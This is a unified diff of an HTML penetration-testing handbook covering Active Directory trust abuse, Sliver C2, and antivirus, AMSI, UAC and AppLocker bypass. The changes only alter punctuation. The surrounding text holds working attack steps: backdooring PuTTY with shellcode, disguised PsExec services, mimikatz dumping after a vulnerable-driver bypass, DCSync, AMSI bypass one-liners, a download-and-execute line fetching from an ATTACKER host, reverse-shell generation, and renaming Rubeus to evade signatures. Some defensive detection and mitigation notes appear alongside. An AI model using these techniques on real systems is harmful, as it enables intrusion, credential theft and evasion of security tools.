 <h3 id="trust-account-attack">12.11 Trust Account Attack</h3>
 
-<p>When a one-way outbound trust is established from Forest-A to Forest-B, a trust account named <code>A$</code> is created in Forest-B with Domain Users privileges. The trust account's password is stored as trust keys in Trusted Domain Objects (TDOs) on both sides. An administrator of Forest-A can extract these keys and authenticate as the trust account in Forest-B, gaining regular domain user access -- enough for enumeration, Kerberoasting, and further attacks.</p>
+<p>When a one-way outbound trust is established from Forest-A to Forest-B, a trust account named <code>A$</code> is created in Forest-B with Domain Users privileges. The trust account's password is stored as trust keys in Trusted Domain Objects (TDOs) on both sides. An administrator of Forest-A can extract these keys and authenticate as the trust account in Forest-B, gaining regular domain user access; enough for enumeration, Kerberoasting, and further attacks.</p>
 
-<p>Root cause: Trust keys stored in TDOs are derived from the trust account's password. The RC4 keys are identical on both sides of the trust. By extracting the RC4 trust key from Forest-A's TDO, an attacker can authenticate as <code>ForestB\ForestA$</code> -- a regular domain user in Forest-B. This effectively reverses the expected access direction of a one-way outbound trust.</p>
+<p>Root cause: Trust keys stored in TDOs are derived from the trust account's password. The RC4 keys are identical on both sides of the trust. By extracting the RC4 trust key from Forest-A's TDO, an attacker can authenticate as <code>ForestB\ForestA$</code>: a regular domain user in Forest-B. This effectively reverses the expected access direction of a one-way outbound trust.</p>
 
 <h4 id="trust-account-steps">12.11.1 Performing the Attack</h4>
 
@@ -13964,7 +13964,7 @@ dir \\[foreign-dc-fqdn]\c$</code></pre>
 
 <h4 id="cve-2020-0665-attack">12.14.2 Performing the Attack</h4>
 
-<p>Step 4: Convert both SIDs to binary representation and update <code>frida_intercept.py</code> -- replace <code>var buf1</code> with the child domain SID binary and <code>var newsid</code> with the target server's local SID binary.</p>
+<p>Step 4: Convert both SIDs to binary representation and update <code>frida_intercept.py</code>: replace <code>var buf1</code> with the child domain SID binary and <code>var newsid</code> with the target server's local SID binary.</p>
 
 <pre><code class="language-bash"># Step 1: Get local SID of target server
 proxychains python getlocalsid.py [domain]/[email protected] SQL02
@@ -14252,10 +14252,10 @@ Set-ADObject -Identity "CN=Tom,CN=Shadow Principal Configuration,CN=Services,CN=
 <!-- ============================================================ -->
 
 <h4>Remediation</h4>
-<p>Heavily protect the bastion forest -- it is the single point of control. Implement MFA for all bastion forest access. Use time-limited shadow principal memberships (PAM feature). Monitor shadow principal creation and membership changes. Limit who can create objects in the Shadow Principal Configuration container. Audit all existing shadow principal mappings regularly.</p>
+<p>Heavily protect the bastion forest; it is the single point of control. Implement MFA for all bastion forest access. Use time-limited shadow principal memberships (PAM feature). Monitor shadow principal creation and membership changes. Limit who can create objects in the Shadow Principal Configuration container. Audit all existing shadow principal mappings regularly.</p>
 <h3 id="trust-mitigations">12.18 Trust Attack Mitigations and Detections</h3>
 
-<p>Trust attacks cannot always be fully prevented -- if a child domain in a forest is compromised, the parent domain is compromised via ExtraSIDs. Defenses focus on layered protections that limit blast radius and enable early detection.</p>
+<p>Trust attacks cannot always be fully prevented; if a child domain in a forest is compromised, the parent domain is compromised via ExtraSIDs. Defenses focus on layered protections that limit blast radius and enable early detection.</p>
 
 <h4 id="hardening">12.18.1 Hardening Considerations</h4>
 
@@ -14302,13 +14302,13 @@ Set-ADObject -Identity "CN=Tom,CN=Shadow Principal Configuration,CN=Services,CN=
 <li>Tickets with abnormally long lifetimes</li>
 </ul>
 
-<p><strong>Event ID 4768</strong> (TGT Request) -- monitor for cross-domain AS-REQ requests.</p>
+<p><strong>Event ID 4768</strong> (TGT Request); monitor for cross-domain AS-REQ requests.</p>
 
-<p><strong>Event ID 5136</strong> (Directory Service Object Modification) -- monitor for Configuration NC changes, especially in Certificate Templates, Sites, and DNS containers.</p>
+<p><strong>Event ID 5136</strong> (Directory Service Object Modification); monitor for Configuration NC changes, especially in Certificate Templates, Sites, and DNS containers.</p>
 
-<p><strong>Event ID 4720</strong> (User Account Created) -- detect backdoor user creation from GPO attacks.</p>
+<p><strong>Event ID 4720</strong> (User Account Created); detect backdoor user creation from GPO attacks.</p>
 
-<p><strong>Event ID 4728/4732/4756</strong> (Group Membership Changes) -- detect unauthorized additions to privileged groups.</p>
+<p><strong>Event ID 4728/4732/4756</strong> (Group Membership Changes); detect unauthorized additions to privileged groups.</p>
 
 <p>Advanced detection: Organizations can use Kusto Query Language (KQL) in Microsoft Sentinel to comprehensively track trust enumeration activities.</p>
 
@@ -14325,7 +14325,7 @@ Set-ADObject -Identity "CN=Tom,CN=Shadow Principal Configuration,CN=Services,CN=
 
 <h4 id="attack-lifecycle">13.1.1 Attack Lifecycle (Cyber Kill Chain)</h4>
 
-<p>Developed by Lockheed Martin in 2011, the <strong>Cyber Kill Chain</strong> categorizes the attack lifecycle into seven steps. One critical aspect not explicitly listed is <strong>Operational Security (OpSec)</strong> -- minimizing footprints to hide presence on target systems.</p>
+<p>Developed by Lockheed Martin in 2011, the <strong>Cyber Kill Chain</strong> categorizes the attack lifecycle into seven steps. One critical aspect not explicitly listed is <strong>Operational Security (OpSec)</strong>: minimizing footprints to hide presence on target systems.</p>
 <pre><code class="language-powershell"># Find users who are members of groups outside their domain
 Import-Module .\PowerView.ps1
 Get-DomainForeignUser
@@ -14349,9 +14349,9 @@ Get-DomainGroup -Identity '[group-name]' -domain [domain] | Select memberof</cod
 
 <p>Sliver provides three key components:</p>
 <ul>
-<li><strong>Implants</strong> -- Binaries/executables used to preserve access to a target, facilitated by the C2 server</li>
-<li><strong>Beacons</strong> -- The process of communicating from the target host to the C2 over a set interval (non-interactive, executes commands at intervals)</li>
-<li><strong>Stagers</strong> -- Small code executed on a remote machine that loads a larger payload (staging protocol supports TCP and HTTP/S)</li>
+<li><strong>Implants</strong>: Binaries/executables used to preserve access to a target, facilitated by the C2 server</li>
+<li><strong>Beacons</strong>: The process of communicating from the target host to the C2 over a set interval (non-interactive, executes commands at intervals)</li>
+<li><strong>Stagers</strong>: Small code executed on a remote machine that loads a larger payload (staging protocol supports TCP and HTTP/S)</li>
 </ul>
 
 <p>Key distinction: Beacon mode (BLUE in Sliver console) operates in intervals and is less likely to alert defenders due to non-constant traffic. Session mode (RED) provides immediate interactive command execution. Beacons can be upgraded to sessions using the <code>interactive</code> command.</p>
@@ -14454,7 +14454,7 @@ sliver > jobs</code></pre>
 
 <h4 id="named-pipes">13.2.3 Named Pipes and Pivots</h4>
 
-<p>Named pipes follow the format <code>\\ServerName\pipe\PipeName</code> and are used for pivoting on Windows systems. A pivot listener is similar to a bind shell -- you start a listener on Host A, and Host B connects to it, establishing a communication chain. This is used in environments with restricted traffic routing.</p>
+<p>Named pipes follow the format <code>\\ServerName\pipe\PipeName</code> and are used for pivoting on Windows systems. A pivot listener is similar to a bind shell; you start a listener on Host A, and Host B connects to it, establishing a communication chain. This is used in environments with restricted traffic routing.</p>
 
 <pre><code class="language-bash"># Start a named pipe pivot listener on an active session
 sliver (session) > pivots named-pipe --bind academy
@@ -14558,7 +14558,7 @@ sliver (session) > seatbelt -- -group=system</code></pre>
 
 <p>OpSec concerns with execute-assembly:</p>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> <code>notepad.exe</code> (or any specified process) appears as a <strong>managed</strong> process -- unusual for notepad</label></li>
+<li><label><input type="checkbox"> <code>notepad.exe</code> (or any specified process) appears as a <strong>managed</strong> process; unusual for notepad</label></li>
 <li><label><input type="checkbox"> Hardcoded strings like "Seatbelt" are easily found in process memory</label></li>
 <li><label><input type="checkbox"> Unusual API calls may appear suspicious for the injected process</label></li>
 <li><label><input type="checkbox"> The spawned child process creates a parent-child relationship that defenders can inspect in Process Explorer or Process Hacker</label></li>
@@ -14734,7 +14734,7 @@ sliver > http -L [attacker-ip] -l 9002
 # Backdoor PuTTY
 sliver (session) > backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"</code></pre>
 
-<p>The backdoored binary may not function normally -- PuTTY will not load but the beacon callback will occur. The process validates the profile, injects shellcode into the original binary, and uploads the modified version to replace the original.</p>
+<p>The backdoored binary may not function normally; PuTTY will not load but the beacon callback will occur. The process validates the profile, injects shellcode into the original binary, and uploads the modified version to replace the original.</p>
 
 
 <h4>Methodology</h4>
@@ -14753,7 +14753,7 @@ sliver (session) > backdoor --profile persistence-shellcode "C:\Program Files\Pu
 
 <h3 id="domain-recon">13.7 Domain Reconnaissance</h3>
 
-<p>Domain reconnaissance must be performed from a domain context (domain user, SYSTEM on a domain-joined machine, or machine account) -- local accounts cannot query domain information effectively.</p>
+<p>Domain reconnaissance must be performed from a domain context (domain user, SYSTEM on a domain-joined machine, or machine account); local accounts cannot query domain information effectively.</p>
 
 <h4 id="powerview-recon">13.7.1 PowerView via sharpsh</h4>
 
@@ -14794,7 +14794,7 @@ sliver (beacon) > delegationbof 6 [domain]</code></pre>
 
 <pre><code class="language-bash">sliver (beacon) > certify -- find</code></pre>
 
-<p>Look for templates with <code>ENROLLEE_SUPPLIES_SUBJECT</code> flag and <code>Client Authentication</code> EKU -- these indicate potentially exploitable ESC1 vulnerabilities.</p>
+<p>Look for templates with <code>ENROLLEE_SUPPLIES_SUBJECT</code> flag and <code>Client Authentication</code> EKU; these indicate potentially exploitable ESC1 vulnerabilities.</p>
 
 <h4 id="native-recon">13.7.5 Native Domain Enumeration</h4>
 
@@ -14973,7 +14973,7 @@ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</code></pre></li>
 <tr><td><code>LOGON_BATCH</code></td><td>Scheduled task or startup execution</td></tr>
 <tr><td><code>LOGON_SERVICE</code></td><td>Account with service privileges</td></tr>
 <tr><td><code>LOGON_NETWORK_CLEARTEXT</code></td><td>Uses plaintext credentials</td></tr>
-<tr><td><code>LOGON_NEW_CREDENTIALS</code></td><td>Default -- clones current token, new creds for outbound connections</td></tr>
+<tr><td><code>LOGON_NEW_CREDENTIALS</code></td><td>Default; clones current token, new creds for outbound connections</td></tr>
 </tbody>
 </table>
 
@@ -15020,7 +15020,7 @@ sliver > generate --format service -i [target-ip]:9898 --skip-symbols -N psexec-
 # Execute PsExec with custom service name/description (OpSec)
 sliver (session) > psexec --custom-exe psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams [target-fqdn]</code></pre>
 
-<p>OpSec notes: Sliver generates a random filename and places it in <code>C:\Windows\Temp</code> by default. The default service name is "Sliver" with description "Sliver implant" -- always customize these to blend in. Use <code>--binpath</code> to change the upload directory.</p>
+<p>OpSec notes: Sliver generates a random filename and places it in <code>C:\Windows\Temp</code> by default. The default service name is "Sliver" with description "Sliver implant"; always customize these to blend in. Use <code>--binpath</code> to change the upload directory.</p>
 
 <h4 id="wmic-lateral">13.11.2 WMI / WMIC</h4>
 
@@ -15149,7 +15149,7 @@ net start RTCore64
 # Now dump credentials successfully
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</code></pre>
 
-<p>Tools for PPL bypass: <strong>PPLControl</strong>, <strong>EDRSandblast</strong>, <strong>RToolZ</strong> -- all abuse vulnerable signed drivers (RTCore64.sys, ProcExp152.sys) to execute arbitrary kernel code.</p>
+<p>Tools for PPL bypass: <strong>PPLControl</strong>, <strong>EDRSandblast</strong>, <strong>RToolZ</strong>: all abuse vulnerable signed drivers (RTCore64.sys, ProcExp152.sys) to execute arbitrary kernel code.</p>
 
 
 <h4>Methodology</h4>
@@ -15235,7 +15235,7 @@ sliver (beacon) > c2tc-kerberoast roast TARGET</code></pre></li>
 <pre><code class="language-bash"># DCSync using secretsdump with compromised DCSync-capable credentials
 proxychains impacket-secretsdump -just-dc mobilesec:spongebob@[target-ip]</code></pre>
 
-<p>Granting DCSync permissions (Method 1 -- Rubeus + SharpView from Sliver):</p>
+<p>Granting DCSync permissions (Method 1; Rubeus + SharpView from Sliver):</p>
 <pre><code class="language-bash"># Get a TGT for the domain admin using their hash
 sliver (session) > rubeus -- asktgt /user:Administrator /d:[domain] /rc4:&lt;ntlm_hash&gt; /ptt
 
@@ -15253,7 +15253,7 @@ sliver (dc-session) > sharpview -- 'Add-DomainObjectAcl -PrincipalIdentity [svc-
 # Verify via secretsdump
 proxychains impacket-secretsdump -just-dc '[svc-user]:[password]'@[target-ip]</code></pre>
 
-<p>Granting DCSync permissions (Method 2 -- Evil-WinRM + PowerView):</p>
+<p>Granting DCSync permissions (Method 2; Evil-WinRM + PowerView):</p>
 <pre><code class="language-bash"># Connect to DC with admin hash
 proxychains evil-winrm -i [target-ip] -u Administrator -H &lt;ntlm_hash&gt; -s .
 
@@ -15567,19 +15567,19 @@ Set-MpPreference -DisableRealTimeMonitoring $false</code></pre>
 
 <p><strong>Key fields in <code>Get-MpComputerStatus</code>:</strong></p>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> <code>AntivirusSignatureLastUpdated</code> -- when signatures were last refreshed</label></li>
-<li><label><input type="checkbox"> <code>IsTamperProtected</code> -- whether Tamper Protection prevents settings changes</label></li>
-<li><label><input type="checkbox"> <code>IsVirtualMachine</code> -- VM detection (Defender behaves differently in VMs)</label></li>
-<li><label><input type="checkbox"> <code>RealTimeProtectionEnabled</code> -- whether on-access scanning is active</label></li>
+<li><label><input type="checkbox"> <code>AntivirusSignatureLastUpdated</code>: when signatures were last refreshed</label></li>
+<li><label><input type="checkbox"> <code>IsTamperProtected</code>: whether Tamper Protection prevents settings changes</label></li>
+<li><label><input type="checkbox"> <code>IsVirtualMachine</code>: VM detection (Defender behaves differently in VMs)</label></li>
+<li><label><input type="checkbox"> <code>RealTimeProtectionEnabled</code>: whether on-access scanning is active</label></li>
 </ul>
 
 
 <p><strong>Key fields in <code>Get-MpThreatDetection</code>:</strong></p>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> <code>DetectionSourceTypeID</code> -- how the detection was triggered (on-access, behavioral, etc.)</label></li>
-<li><label><input type="checkbox"> <code>ProcessName</code> -- which process triggered the detection</label></li>
-<li><label><input type="checkbox"> <code>Resources</code> -- the file or memory region flagged</label></li>
-<li><label><input type="checkbox"> <code>InitialDetectionTime</code> / <code>RemediationTime</code> -- timeline of detection and response</label>
+<li><label><input type="checkbox"> <code>DetectionSourceTypeID</code>: how the detection was triggered (on-access, behavioral, etc.)</label></li>
+<li><label><input type="checkbox"> <code>ProcessName</code>: which process triggered the detection</label></li>
+<li><label><input type="checkbox"> <code>Resources</code>: the file or memory region flagged</label></li>
+<li><label><input type="checkbox"> <code>InitialDetectionTime</code> / <code>RemediationTime</code>: timeline of detection and response</label>
 <pre><code class="language-powershell"># Example: viewing a Cobalt Strike detection
 PS C:\> Get-MpThreat
 CategoryID       : 6
@@ -15634,7 +15634,7 @@ Get-MpThreatDetection</code></pre></li>
 
 <ul>
 <li><strong>Enable Tamper Protection</strong> to prevent attackers from disabling Defender via PowerShell or registry changes</li>
-<li><strong>Keep signatures updated</strong> -- stale signatures miss new threats</li>
+<li><strong>Keep signatures updated</strong>: stale signatures miss new threats</li>
 <li><strong>Enable cloud-delivered protection</strong> for ML-based detection beyond local signatures</li>
 <li><strong>Restrict who can modify Defender settings</strong> via Group Policy or Intune</li>
 <li><strong>Monitor for <code>Set-MpPreference -DisableRealTimeMonitoring</code></strong> in PowerShell logs as an indicator of attacker activity</li>
@@ -15648,7 +15648,7 @@ Get-MpThreatDetection</code></pre></li>
 
 <h4 id="static-how">14.2.1 How Static Analysis Works</h4>
 
-<p>File hash matching: If a file's SHA256 hash matches a known malware sample (e.g., WannaCry: <code>ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa</code>), it is flagged immediately. This is the simplest but also the easiest to defeat -- changing a single byte alters the hash.</p>
+<p>File hash matching: If a file's SHA256 hash matches a known malware sample (e.g., WannaCry: <code>ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa</code>), it is flagged immediately. This is the simplest but also the easiest to defeat; changing a single byte alters the hash.</p>
 
 <p>Byte pattern / string matching: More robust than hash matching. Defender uses patterns of bytes and strings to identify malware families even when the hash changes. For example, a YARA rule for WannaCry might use 15 different strings and 6 byte sequences, so modifying one string is not enough.</p>
 
@@ -15696,7 +15696,7 @@ while (i &lt; buf.Length)
 
 <h4 id="static-aes">14.2.4 AES Encryption (Effective for Static Bypass)</h4>
 
-<p>Use AES encryption with a proper key and IV to encrypt the shellcode. AES is cryptographically strong -- Defender cannot brute-force the key to check the plaintext. At runtime, decrypt using the embedded key/IV before writing to memory.</p>
+<p>Use AES encryption with a proper key and IV to encrypt the shellcode. AES is cryptographically strong; Defender cannot brute-force the key to check the plaintext. At runtime, decrypt using the embedded key/IV before writing to memory.</p>
 
 <p>Workflow:</p>
 <ul class="methodology-checklist">
@@ -15818,7 +15818,7 @@ namespace NotMalware
 
 <h4 id="dynamic-how">14.3.1 How Dynamic Analysis Works</h4>
 
-<p>When Defender detects a suspicious operation -- such as a process spawning another process, allocating RWX memory, or calling certain API sequences -- it triggers a <strong>memory scan</strong> of the process. At this point, the shellcode is already decrypted in memory, so byte-pattern matching can identify known payloads like Meterpreter.</p>
+<p>When Defender detects a suspicious operation; such as a process spawning another process, allocating RWX memory, or calling certain API sequences; it triggers a <strong>memory scan</strong> of the process. At this point, the shellcode is already decrypted in memory, so byte-pattern matching can identify known payloads like Meterpreter.</p>
 
 <pre><code class="language-powershell"># After NotMalware.exe (with AES-encrypted Meterpreter) was caught:
 PS C:\> Get-MpThreatDetection
@@ -15841,7 +15841,7 @@ PS C:\> Get-MpThreatDetection
 
 <p>Replace well-known shellcode (Meterpreter) with a less-known alternative. Since the goal is often just a reverse shell, use a minimal, lesser-known shellcode generator that Defender does not yet have signatures for.</p>
 
-<p><strong>Example: micr0_shell</strong> -- generates position-independent, null-free reverse shell shellcode for Windows x64.</p>
+<p><strong>Example: micr0_shell</strong>: generates position-independent, null-free reverse shell shellcode for Windows x64.</p>
 
 <pre><code class="language-powershell"># Generate C# formatted shellcode with micr0_shell
 python.exe .\micr0_shell.py -i [attacker-ip] -p 8080 -l csharp
@@ -15857,7 +15857,7 @@ python.exe .\micr0_shell.py -i [attacker-ip] -p 8080 -l csharp
 </ul>
 
 
-<p>Defender likely does not have a signature for micr0_shell's shellcode. Even if a memory scan is triggered, no match is found. However, if micr0_shell becomes widely used, Microsoft will develop signatures for it too -- the less popular the tool, the longer it stays undetected.</p>
+<p>Defender likely does not have a signature for micr0_shell's shellcode. Even if a memory scan is triggered, no match is found. However, if micr0_shell becomes widely used, Microsoft will develop signatures for it too; the less popular the tool, the longer it stays undetected.</p>
 
 <h4 id="dynamic-option3">14.3.4 Option 3: Writing Custom Tools</h4>
 
@@ -15938,7 +15938,7 @@ namespace RShell
 
 <p>Why custom tools evade detection:</p>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> No known malicious signatures match -- the code is entirely original</label></li>
+<li><label><input type="checkbox"> No known malicious signatures match; the code is entirely original</label></li>
 <li><label><input type="checkbox"> Uses standard .NET classes (<code>TcpClient</code>, <code>Process</code>, <code>StreamReader</code>) that are legitimate</label></li>
 <li><label><input type="checkbox"> Even if Defender scans the process memory, nothing matches known malware patterns</label></li>
 <li><label><input type="checkbox"> No obfuscation or encryption needed since no component is inherently malicious</label></li>
@@ -16174,7 +16174,7 @@ VirtualProtectEx(hProcess, addr, (uint)buf.Length, 0x20, out oldProtect);</code>
 <!-- ═══════════════════════════════════════════════════════════════ -->
 <h3 id="amsi">14.5 Antimalware Scan Interface (AMSI)</h3>
 
-<p>AMSI is a standardized Windows interface that allows applications to submit content to the installed antimalware solution for scanning <strong>before execution</strong>. Think of it as a runtime content scanner -- applications like PowerShell pass commands through AMSI, and Defender checks them against signatures before allowing execution.</p>
+<p>AMSI is a standardized Windows interface that allows applications to submit content to the installed antimalware solution for scanning <strong>before execution</strong>. Think of it as a runtime content scanner; applications like PowerShell pass commands through AMSI, and Defender checks them against signatures before allowing execution.</p>
 
 <h4 id="amsi-overview">14.5.1 How AMSI Works</h4>
 
@@ -16204,7 +16204,7 @@ VirtualProtectEx(hProcess, addr, (uint)buf.Length, 0x20, out oldProtect);</code>
 <pre><code class="language-csharp">if (amsiInitFailed)
     return AMSI_RESULT_NOT_DETECTED;</code></pre>
 
-<p>If <code>amsiInitFailed</code> is <code>true</code>, the method returns <code>AMSI_RESULT_NOT_DETECTED</code> immediately -- no scan occurs. The bypass simply sets this private static field to <code>true</code> using .NET reflection.</p>
+<p>If <code>amsiInitFailed</code> is <code>true</code>, the method returns <code>AMSI_RESULT_NOT_DETECTED</code> immediately; no scan occurs. The bypass simply sets this private static field to <code>true</code> using .NET reflection.</p>
 
 <p>Original command (now detected):</p>
 <pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
@@ -16333,7 +16333,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')</cod
 <tbody>
 <tr><td>Script Block Logging (GPO)</td><td>Logs full PowerShell script content even after AMSI is bypassed; enables forensic review</td></tr>
 <tr><td>Module Logging</td><td>Logs module load events and pipeline execution</td></tr>
-<tr><td>Constrained Language Mode</td><td>Prevents <code>Add-Type</code>, .NET reflection, and P/Invoke -- blocks Bypass 2 entirely</td></tr>
+<tr><td>Constrained Language Mode</td><td>Prevents <code>Add-Type</code>, .NET reflection, and P/Invoke; blocks Bypass 2 entirely</td></tr>
 <tr><td>Enable Tamper Protection</td><td>Prevents modification of Defender/AMSI settings and DLLs</td></tr>
 <tr><td>Monitor for AMSI bypass indicators</td><td>Alert on strings like "amsiInitFailed", "AmsiScanBuffer", "amsiContext" in PowerShell transcripts</td></tr>
 <tr><td>ETW (Event Tracing for Windows)</td><td>AMSI events are logged via ETW even if the bypass succeeds; correlate with other telemetry</td></tr>
@@ -16352,19 +16352,19 @@ IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')</cod
 
 <p>Detailed walkthrough with Rubeus:</p>
 
-<p>Iteration 1 -- String signatures:</p>
+<p>Iteration 1; String signatures:</p>
 <pre><code class="language-powershell"># Scan the compiled binary
 ThreatCheck.exe -f .\Rubeus.exe
 # Result: flagged bytes contain the string "ticket"</code></pre>
 <p>Fix: Use Visual Studio's "Replace in Files" (<code>Ctrl+Shift+H</code>) to replace all instances of <code>ticket</code> with <code>tekcit</code> throughout the solution. Rebuild and rescan.</p>
 
-<p>Iteration 2 -- Class name signatures:</p>
+<p>Iteration 2; Class name signatures:</p>
 <pre><code class="language-powershell"># Rescan after string replacement
 ThreatCheck.exe -f .\Rubeus.exe
 # Result: flagged bytes contain "DiffieHellmanKey"</code></pre>
 <p>Fix: Use Visual Studio's Rename refactoring (right-click class name, select Rename) to change <code>DiffieHellmanKey</code> to <code>DHKey</code>. This safely renames all references. Rebuild and rescan.</p>
 
-<p>Iteration 3 -- Assembly metadata and TypeLib GUID:</p>
+<p>Iteration 3; Assembly metadata and TypeLib GUID:</p>
 <pre><code class="language-powershell"># Rescan shows: flagged bytes contain "Rubeus", copyright info, and a GUID
 # The TypeLib GUID is especially dangerous -- YARA rules match on it alone</code></pre>
 
@@ -16462,7 +16462,7 @@ $bin = @(&lt;byte array of the compiled assembly&gt;);
     $Results;
 }</code></pre>
 
-<p>Critical AMSI consideration: The script will be blocked by AMSI. You <strong>must</strong> use the <code>AmsiScanBuffer</code> patch (Bypass 2) -- not the <code>amsiInitFailed</code> bypass (Bypass 1). Here is why:</p>
+<p>Critical AMSI consideration: The script will be blocked by AMSI. You <strong>must</strong> use the <code>AmsiScanBuffer</code> patch (Bypass 2); not the <code>amsiInitFailed</code> bypass (Bypass 1). Here is why:</p>
 <ul>
 <li>Bypass 1 only disables AMSI at the PowerShell session level</li>
 <li>When <code>[System.Reflection.Assembly]::Load()</code> is called, the .NET runtime's own AMSI integration scans the assembly bytes</li>
@@ -16529,8 +16529,8 @@ $bin = @(&lt;byte array of the compiled assembly&gt;);
 
 <p>Key concept: Lower-integrity objects cannot access higher-integrity objects (no write-up), but the reverse is allowed. When an administrator logs in, they receive <strong>two access tokens</strong>:</p>
 <ul>
-<li><strong>Standard user token (Medium integrity)</strong> -- used by default for all processes</li>
-<li><strong>Administrator token (High integrity)</strong> -- only used when UAC explicitly grants elevation</li>
+<li><strong>Standard user token (Medium integrity)</strong>: used by default for all processes</li>
+<li><strong>Administrator token (High integrity)</strong>: only used when UAC explicitly grants elevation</li>
 </ul>
 
 <p>The attacker's problem: Even with control of an admin account, if you have only a reverse shell (Medium integrity), you cannot perform privileged operations like <code>net user /add</code>. UAC blocks the action because the process is running with the standard token.</p>
@@ -16631,7 +16631,7 @@ Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force</code></pre></
 <tr><th>Defense</th><th>What It Addresses</th></tr>
 </thead>
 <tbody>
-<tr><td>Set UAC to "Always Notify"</td><td>Prompts for all elevation requests, not just for app installs -- prevents silent auto-elevation</td></tr>
+<tr><td>Set UAC to "Always Notify"</td><td>Prompts for all elevation requests, not just for app installs; prevents silent auto-elevation</td></tr>
 <tr><td>Remove users from local Administrators group</td><td>UAC bypasses require an admin account; standard users cannot exploit them</td></tr>
 <tr><td>Monitor registry keys</td><td>Alert on writes to <code>HKCU:\Software\Classes\ms-settings\Shell\Open\command</code> and <code>HKCU:\Environment\windir</code></td></tr>
 <tr><td>Monitor scheduled task execution</td><td>Alert on <code>SilentCleanup</code> being triggered by non-system processes</td></tr>
@@ -16678,10 +16678,10 @@ Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Tools\Sysinternal
 # Output: Allowed (Default Rule) All files...</code></pre>
 
 <ul>
-<li><code>EnforcementMode="Enabled"</code> -- rules are actively enforced (vs. "AuditOnly")</li>
-<li><code>FilePathCondition</code> -- path-based rules (most common and most exploitable)</li>
-<li><code>UserOrGroupSid="S-1-1-0"</code> -- the Everyone group (all users)</li>
-<li><code>UserOrGroupSid="S-1-5-32-544"</code> -- the local Administrators group</li>
+<li><code>EnforcementMode="Enabled"</code>: rules are actively enforced (vs. "AuditOnly")</li>
+<li><code>FilePathCondition</code>: path-based rules (most common and most exploitable)</li>
+<li><code>UserOrGroupSid="S-1-1-0"</code>: the Everyone group (all users)</li>
+<li><code>UserOrGroupSid="S-1-5-32-544"</code>: the local Administrators group</li>
 </ul>
 
 <h4 id="applocker-default-bypass">14.8.3 Exploiting the Default Ruleset</h4>
@@ -16777,7 +16777,7 @@ C:\Windows\Tasks\payload.exe</code></pre></li>
 
 <p>Why LOLBAS is powerful:</p>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> Binaries are already present -- no need to transfer tools</label></li>
+<li><label><input type="checkbox"> Binaries are already present; no need to transfer tools</label></li>
 <li><label><input type="checkbox"> They are Microsoft-signed, passing publisher-based AppLocker rules</label></li>
 <li><label><input type="checkbox"> Execution blends in with legitimate system activity</label></li>
 <li><label><input type="checkbox"> No custom binary to trigger AV signatures</label></li>
@@ -16926,7 +16926,7 @@ namespace RShell_D
 
 
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> No <code>string[] args</code> -- IP/port are hardcoded (DllMain cannot receive arbitrary arguments)</label></li>
+<li><label><input type="checkbox"> No <code>string[] args</code>: IP/port are hardcoded (DllMain cannot receive arbitrary arguments)</label></li>
 <li><label><input type="checkbox"> Uses 32-bit PowerShell path (<code>SysWOW64</code>) if compiled as x86, or 64-bit if compiled as x64</label></li>
 <li><label><input type="checkbox"> The <code>[DllExport("DllMain")]</code> attribute marks the exported function</label></li>
 </ul>
@@ -17715,10 +17715,10 @@ foreach ($Server in $Out) { $Server.CustomQuery | ForEach-Object { Write-Host $_
 <p>Keep all unused features disabled. Pay special attention to:</p>
 
 <ul>
-  <li><code>xp_cmdshell</code> -- command execution</li>
-  <li><code>Ole Automation Procedures</code> -- COM object interaction / code execution</li>
-  <li><code>clr enabled</code> -- run user assemblies</li>
-  <li><code>show advanced options</code> -- should remain disabled unless necessary</li>
+  <li><code>xp_cmdshell</code>: command execution</li>
+  <li><code>Ole Automation Procedures</code>: COM object interaction / code execution</li>
+  <li><code>clr enabled</code>: run user assemblies</li>
+  <li><code>show advanced options</code>: should remain disabled unless necessary</li>
 </ul>
 
 <p>Revoke EXECUTE permissions on dangerous stored procedures:</p>
@@ -17735,7 +17735,7 @@ REVOKE EXECUTE ON xp_subdirs TO public;</code></pre>
   <li>Restrict file permissions on MSSQL Server files</li>
   <li>Host applications and MSSQL on separate servers</li>
   <li>Review all applications for <strong>SQL injection</strong> vulnerabilities</li>
-  <li>Restrict network access to TCP/1433 -- block public internet access</li>
+  <li>Restrict network access to TCP/1433; block public internet access</li>
   <li>Conduct <strong>regular security audits</strong> (run <code>Invoke-SQLAudit</code> from PowerUpSQL as a minimum)</li>
 </ul>
 
@@ -17777,7 +17777,7 @@ REVOKE EXECUTE ON xp_subdirs TO public;</code></pre>
   </tbody>
 </table>
 
-<p>The expected login schema is <code>DOMAIN\username</code>. Key views in OWA include Inbox, Drafts, Sent Items, Deleted Items, Junk, and <strong>People</strong> (which lists all users on the email server with details like roles and phone numbers -- valuable for phishing).</p>
+<p>The expected login schema is <code>DOMAIN\username</code>. Key views in OWA include Inbox, Drafts, Sent Items, Deleted Items, Junk, and <strong>People</strong> (which lists all users on the email server with details like roles and phone numbers; valuable for phishing).</p>
 
 <h4 id="exchange-intro-methodology">15.7.1 Methodology</h4>
 
@@ -19651,7 +19651,7 @@ python3 sccmhunter.py admin -u USER -p PASS -ip SMS_IP -au 'PWNED$' -ap Computer
 </div>
 </div>
 <div class="nested-dropdown">
-<button class="nested-dropdown-btn">11.3 ESC1 -- Misconfigured Certificate Template (Enrollee Supplies Subject)<i class="bi bi-caret-down-fill"></i></button>
+<button class="nested-dropdown-btn">11.3 ESC1; Misconfigured Certificate Template (Enrollee Supplies Subject)<i class="bi bi-caret-down-fill"></i></button>
